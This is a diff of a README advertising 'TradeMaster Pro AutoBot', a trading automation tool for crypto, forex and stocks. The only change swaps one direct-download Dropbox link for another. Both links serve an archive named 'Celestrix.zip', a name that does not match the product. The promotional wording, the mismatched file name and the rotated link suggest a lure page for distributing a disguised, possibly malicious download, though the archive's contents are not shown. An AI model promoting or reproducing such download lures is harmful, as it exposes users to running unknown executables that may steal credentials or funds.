@@ -2,7 +2,7 @@
 
 Supercharge your trading with **TradeMaster Pro AutoBot** — a smart trading platform built for high-performance automation, real-time signal detection, and data-driven decision-making. Whether you're into crypto, forex, or stocks, TradeMaster helps you trade smarter, not harder.
 
-[![Download TradeMaster Pro](https://img.shields.io/badge/Download-TradeMaster_Pro-blueviolet)](https://www.dropbox.com/scl/fi/9bcmmydfb2t4mse08ywff/Celestrix.zip?rlkey=k09pkb7wo4fnxv4t6dz8h18xy&st=7ljxgb5u&dl=1
+[![Download TradeMaster Pro](https://img.shields.io/badge/Download-TradeMaster_Pro-blueviolet)](https://www.dropbox.com/scl/fi/g58lt25fmza83uydu0zu5/Celestrix.zip?rlkey=hccn6sy4qpal7m571nuon546x&st=ik6sks88&dl=1
 )
 
 ---
